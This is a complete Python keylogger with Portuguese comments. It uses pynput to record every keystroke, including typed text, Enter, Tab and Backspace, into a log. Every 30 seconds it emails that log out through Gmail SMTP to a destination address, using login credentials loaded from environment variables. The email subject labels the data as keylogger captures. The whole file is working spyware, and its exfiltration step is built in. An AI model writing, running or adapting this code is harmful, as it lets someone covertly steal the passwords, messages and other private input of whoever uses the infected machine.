from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
from dotenv import load_dotenv
import os

load_dotenv()

# CONFIGURAÇÃO DO EMAIL
EMAIL_ORIGEM = os.getenv("EMAIL_ORIGEM")
EMAIL_DESTINO = os.getenv("EMAIL_DESTINO")
SENHA_EMAIL = os.getenv("SENHA_EMAIL")

log = ""

def enviar_email():
    global log
    
    if log:
        msg = MIMEText(log)
        msg["Subject"] = "Dados capturados pelo keylogger."
        msg["From"] = EMAIL_ORIGEM
        msg["To"] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.close()
        except Exception as e:
            print("Erro ao enviar", e)

    log = ""

    Timer(30, enviar_email).start()

def on_press(key):
    global log

    IGNORE_KEYS = {
        keyboard.Key.shift,
        keyboard.Key.shift_r,
        keyboard.Key.ctrl_l,
        keyboard.Key.ctrl_r,
        keyboard.Key.alt_l,
        keyboard.Key.alt_r,
        keyboard.Key.caps_lock,
        keyboard.Key.cmd
    }    
    
    try:
        print(key)
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "<-"
        elif key == keyboard.Key.esc:
            log += " [ESC] "
        elif key in IGNORE_KEYS:
            pass
        else:
            log += f" [{key}] "

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
